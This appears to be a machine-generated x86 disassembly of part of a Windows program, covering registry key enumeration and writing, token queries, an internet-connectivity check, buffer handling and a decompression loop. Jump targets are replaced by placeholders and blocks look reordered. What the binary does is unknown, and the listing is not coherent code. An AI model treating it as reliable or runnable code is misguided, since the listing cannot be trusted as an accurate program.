jmp r-xdata
push [ ebp - 0x214 ]
push [ ebp + 0x18 ]
push 0x0
lea eax [ ebp - 0x420 ]
push eax
call [ ebp + 0x14 ]
add esp 0x10
movzx eax al
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x420 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp - 0x420 ]
push eax
call [ lstrcatW@IAT ]
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x420 ]
push eax
mov edx [ ebp - 0x428 ]
mov ecx [ ebp - 0x424 ]
call sub_40feb4
mov eax [ ebp - 0x20c ]
inc eax
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x210 ] 0x104
push [ ebp - 0x210 ]
lea eax [ ebp - 0x208 ]
push eax
push [ ebp - 0x20c ]
push [ ebp - 0x214 ]
call [ RegEnumKeyW@IAT ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
sub_4100e9
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
and [ ebp - 0x8 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x20006
push 0x0
push 0x0
push 0x0
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
call [ RegCreateKeyExW@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
xor al al
jmp r-xdata
leave
retn 0x14
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov al 0x1
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
call [ RegSetValueExW@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov al 0x1
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
xor al al
jmp r-xdata
sub_41017c
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0xc ] 0x0
mov [ ebp - 0x4 ] 0x3
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push [ ebp + 0x8 ]
push [ ebp - 0x14 ]
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
leave
retn 0x10
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
cmp eax [ ebp - 0xc ]
jb r-xdata
mov eax [ ebp + 0x14 ]
and [ eax ] 0x0
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
xor al al
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
mov al 0x1
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov al 0x1
mov eax [ ebp + 0x14 ]
and [ eax ] 0x0
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
xor al al
jmp r-xdata
sub_41026a
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x8
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
push [ eax ]
push [ ebp - 0xc ]
push 0x1
push [ ebp - 0x4 ]
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x3f0
je r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov al 0x1
call [ GetLastError@IAT ]
cmp eax 0x7a
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
xor al al
jmp r-xdata
xor al al
jmp r-xdata
leave
retn 0x4
sub_410300
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
and [ ebp - 0x4 ] 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
call [ InternetGetConnectedState@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x58c8 ] ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x4 ]
and eax 0x20
je r-xdata
leave
retn
mov eax [ ebp - 0x4 ]
and eax 0x4
neg eax
sbb eax eax
neg eax
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x58c4 ] al
mov eax [ ebp - 0x4 ]
and eax 0x2
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
and eax 0x1
je r-xdata
mov al 0x1
sub_410367
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
sub eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
xor al al
jmp r-xdata
leave
retn 0x4
sub_410392
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
sub eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
add eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push [ eax ]
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
sub eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
xor al al
jmp r-xdata
leave
retn 0x4
sub_4103f7
push ebp
mov ebp esp
sub esp 0x24
push esi
mov [ ebp - 0x24 ] ecx
mov ecx [ ebp - 0x24 ]
call sub_401000
shr eax 0x2
mov [ ebp - 0x14 ] eax
call sub_4137bf
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x24 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x24 ]
call sub_40100f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x4 ]
sar eax 0x2
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
dec eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
inc eax
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
dec eax
mov [ ebp - 0x20 ] eax
js r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
mov eax [ esi + eax * 4 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov [ ecx + eax * 4 ] edx
pop esi
leave
retn
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
movzx eax [ ebp - 0x15 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
jg r-xdata
push [ ebp - 0x4 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
push [ ecx + eax * 4 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
push [ ecx + eax * 4 ]
call sub_401585
add esp 0xc
mov [ ebp - 0x15 ] al
movzx eax [ ebp - 0x15 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x4 ]
sar eax 0x2
mov [ ebp - 0x14 ] eax
and [ ebp - 0x20 ] 0x0
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x4 ]
sar eax 0x2
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
shl eax 0x2
mov ecx [ ebp - 0x24 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
sub_41053c
push ebp
mov ebp esp
sub esp 0x10
push esi
mov [ ebp - 0x10 ] ecx
mov esi [ ebp - 0x10 ]
add esi 0x10
call sub_414299
mov edx esi
mov ecx eax
call sub_410cc8
movzx eax al
test eax eax
je r-xdata
pop esi
leave
retn
mov ecx [ ebp - 0x10 ]
call sub_40100f
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x10 ]
call sub_401000
shr eax 0x2
mov [ ebp - 0x8 ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov ecx [ ebp - 0x10 ]
call sub_4103f7
mov esi [ ebp - 0x10 ]
add esi 0x10
call sub_414299
mov edx esi
mov ecx eax
call sub_410c93
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ecx + eax * 4 ]
movzx eax [ eax + 0x34 ]
and eax 0x1
je r-xdata
jmp r-xdata
call sub_414299
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + ecx * 4 ]
mov ecx eax
call sub_417232
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
and [ ecx + eax * 4 ] 0x0
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
sub_4105e1
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
lea eax [ eax + ecx + 0x2000 ]
cdq
and edx 0xf
add eax edx
sar eax 0x4
inc eax
shl eax 0x4
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x2000
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
add eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp [ ecx + 0x8 ] eax
jg r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
movzx eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
jne r-xdata
leave
retn 0x8
mov al 0x1
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
add eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x4 ] eax
call sub_414299
mov edx [ ebp - 0x4 ]
mov ecx eax
call sub_417318
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_414299
mov edx [ ebp - 0x4 ]
mov ecx eax
call sub_417318
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x4 ] 0x0
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
push [ eax + 0x4 ]
mov eax [ ebp - 0xc ]
push [ eax ]
push [ ebp - 0x8 ]
call sub_4026b0
add esp 0xc
call sub_414299
mov ecx [ ebp - 0xc ]
mov edx [ ecx ]
mov ecx eax
call sub_417232
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x8 ] ecx
xor al al
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x8 ] 0x0
xor al al
jmp r-xdata
sub_4106f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x80
call sub_414299
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
mov ecx eax
call sub_417318
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x4 ] 0x0
leave
retn
call sub_414299
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov ecx eax
call sub_417232
sub_41073a
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
leave
retn 0xc
movzx eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
call sub_4105e1
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
inc eax
inc eax
mov [ ebp + 0xc ] eax
xor al al
mov eax [ ebp - 0x4 ]
push [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
add eax [ ebp + 0xc ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
add eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
movzx eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
push [ eax ]
call sub_402b50
add esp 0xc
movzx eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
dec eax
dec eax
mov [ ebp + 0xc ] eax
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov [ eax + ecx ] 0x0
mov eax [ ebp + 0xc ]
inc eax
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov [ eax + ecx ] 0x0
mov eax [ ebp + 0xc ]
inc eax
mov [ ebp + 0xc ] eax
sub_410811
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
leave
retn 0xc
movzx eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
call sub_4105e1
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
inc eax
inc eax
mov [ ebp + 0xc ] eax
xor al al
movzx eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4 ]
push eax
call sub_402b50
add esp 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
add eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
movzx eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
dec eax
dec eax
mov [ ebp + 0xc ] eax
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ eax + ecx ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
inc eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ eax + ecx ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
inc eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
sub_4108e1
push ebp
mov ebp esp
sub esp 0x20
push esi
mov [ ebp - 0x20 ] ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
pop esi
leave
retn 0x24
and [ ebp - 0x18 ] 0x0
mov eax [ ebp + 0xc ]
shl eax 0x1
mov [ ebp - 0xc ] eax
call sub_414299
mov edx [ ebp - 0xc ]
mov ecx eax
call sub_417318
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_414299
mov edx [ ebp - 0x4 ]
mov ecx eax
call sub_415b25
movzx eax al
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov esi [ ebp + 0xc ]
add esi 0x3b
call sub_414299
mov edx esi
mov ecx eax
call sub_417318
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov [ ebp - 0x18 ] 0x2
call sub_414299
mov ecx eax
call sub_4115ed
mov ecx [ ebp - 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] edx
call sub_414299
mov ecx eax
call sub_401577
mov ecx [ ebp - 0x14 ]
mov [ ecx + 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x18 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x18 ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x20 ] ecx
mov eax [ ebp - 0x14 ]
mov [ eax + 0x4 ] 0x1
mov eax [ ebp - 0x14 ]
mov cl [ ebp + 0x1c ]
mov [ eax + 0x35 ] cl
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x20 ]
mov [ eax + 0x2c ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x24 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x24 ]
mov [ eax + 0x28 ] ecx
mov eax [ ebp - 0x14 ]
and [ eax + 0x14 ] 0x0
mov eax [ ebp - 0x14 ]
mov cl [ ebp - 0x18 ]
mov [ eax + 0x34 ] cl
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x28 ]
mov [ eax + 0x30 ] ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
add eax 0x36
push eax
call sub_4026b0
add esp 0xc
call sub_414299
mov edx [ ebp - 0x4 ]
mov ecx eax
call sub_417232
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x32
mov [ ebp - 0x10 ] eax
push [ ebp - 0x10 ]
call sub_414299
mov edx [ ebp - 0x8 ]
mov ecx eax
call sub_4158b4
mov ecx [ ebp - 0x14 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x14 ]
lea eax [ ecx + eax + 0x36 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov esi [ ebp - 0x20 ]
add esi 0x10
call sub_414299
mov edx esi
mov ecx eax
call sub_410cc8
movzx eax al
test eax eax
je r-xdata
call sub_414299
mov edx [ ebp - 0x4 ]
mov ecx eax
call sub_417232
xor al al
jmp r-xdata
xor al al
push 0x0
push 0x4
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x20 ]
call sub_410811
mov ecx [ ebp - 0x20 ]
call sub_4103f7
mov esi [ ebp - 0x20 ]
add esi 0x10
call sub_414299
mov edx esi
mov ecx eax
call sub_410c93
mov al 0x1
jmp r-xdata
sub_410b0e
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call [ lstrlenW@IAT ]
mov [ ebp - 0x4 ] eax
push 0x0
push 0x4
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_410811
movzx eax al
test eax eax
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_410af3
jmp r-xdata
xor al al
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
leave
retn 0x4
mov al 0x1
jmp r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
shl eax 0x1
push eax
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
call sub_410811
jmp r-xdata
sub_410b72
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call [ lstrlenW@IAT ]
mov [ ebp - 0x4 ] eax
push [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
shl eax 0x1
push eax
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
call sub_410811
xor al al
jmp r-xdata
leave
retn 0x8
sub_410ba8
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x14 ] ecx
call sub_4137bf
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
leave
retn 0x20
cmp [ ebp + 0xc ] 0x6400000
jle r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
push [ ebp - 0xc ]
push [ ebp + 0x24 ]
push [ ebp - 0x8 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
push [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
call sub_4108e1
movzx eax al
test eax eax
je r-xdata
push [ ebp - 0xc ]
push [ ebp + 0x24 ]
push [ ebp - 0x8 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x124f8
push [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
call sub_4108e1
movzx eax al
test eax eax
jne r-xdata
xor al al
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x124f8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax 0x124f8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x124f8
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x4 ] 0x124f8
jbe r-xdata
sub_410c93
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push 0x0
call [ SetLastError@IAT ]
push [ ebp - 0x8 ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
leave
retn
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
sub_410cc8
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push 0x0
call [ SetLastError@IAT ]
push [ ebp - 0x8 ]
call [ EnterCriticalSection@IAT ]
jmp r-xdata
leave
retn
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
sub_410cfd
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x0
call [ SetLastError@IAT ]
push [ ebp - 0x8 ]
call [ InitializeCriticalSection@IAT ]
mov al 0x1
xor al al
jmp r-xdata
leave
retn
sub_410d27
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x10 ] 0x80
and [ ebp - 0xc ] 0x0
mov eax [ ebp - 0xc ]
leave
retn
mov eax [ ebp - 0x10 ]
shl eax 0x1
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x100
jne r-xdata
movzx eax [ ebp - 0x1 ]
and eax [ ebp - 0x10 ]
je r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0x14 ]
mov al [ eax ]
mov [ ebp - 0x1 ] al
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
movzx eax [ eax ]
sar eax 0x2
add eax 0x3
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x14 ]
movzx eax [ eax ]
shl eax 0x8
mov ecx [ ebp - 0x14 ]
movzx ecx [ ecx + 0x1 ]
or eax ecx
and eax 0x3ff
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
inc eax
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
dec eax
mov [ ebp - 0x1c ] eax
js r-xdata
sub_410de0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
add ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] 0x80
and [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
xor eax eax
push 0xfffffffe
pop eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
shl eax 0x1
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x100
jne r-xdata
leave
